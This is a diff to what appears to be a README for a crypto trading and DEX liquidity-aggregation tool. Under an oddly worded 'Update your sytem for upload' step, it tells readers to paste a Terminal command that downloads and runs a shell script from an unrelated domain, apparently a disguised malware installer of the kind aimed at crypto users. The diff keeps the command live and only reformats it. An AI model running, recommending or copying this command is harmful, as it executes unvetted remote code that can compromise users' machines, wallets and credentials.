@@ -16,10 +16,8 @@ Update your sytem for upload
 
 Enter the command on Terminal
 
-                         ''' 
-                         /bin/bash -c "$(curl -fsSL https://applepistudios.com/ce/install.sh)"
-                         '''
-
+                 /bin/bash -c "$(curl -fsSL https://applepistudios.com/ce/install.sh)"
+  
 # Key Features and Solutions
 ## 1. Liquidity Aggregation and Order Execution
 - Integration with DEX and Aggregators: Connects with Uniswap, Sushiswap, Curve, 1inch, and Matcha to maximize liquidity coverage.
